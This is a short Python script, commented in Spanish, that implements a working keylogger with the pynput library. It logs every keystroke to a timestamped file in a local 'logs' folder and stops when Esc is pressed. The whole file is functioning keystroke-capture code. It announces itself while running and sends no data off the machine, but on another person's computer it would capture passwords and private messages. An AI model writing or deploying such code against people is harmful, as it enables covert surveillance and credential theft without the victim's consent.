
import datetime
import os
from pynput import keyboard

timestamp = datetime.datetime.now().strftime('%d-%m-%Y_%H-%M-%S')

# Directorio donde se almacenará el archivo de registro
log_directory = "logs"

# Crea el directorio si no existe
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

log_path = os.path.join(log_directory, 'keylogger_{}.txt'.format(timestamp))

try:
    document = open(log_path, "w")
except PermissionError:
    print("No tienes permiso para crear el archivo de registro en este directorio.")
    exit(1)

def on_press(key):
    try:
        keynames = {
            "Key.enter": '\n',
            "Key.space": ' ',
            "Key.esc": '%ESCAPE ',
            "Key.backspace": '%BORRAR'
        }
        key = str(key)
        translated_key = keynames.get(key, key.replace("'", ""))
        document.write(translated_key)
    except AttributeError:
        print("error")

def on_release(key):
    if key == keyboard.Key.esc:
        document.close()
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger en funcionamiento. Presiona 'Esc' para detener.")
    listener.join()
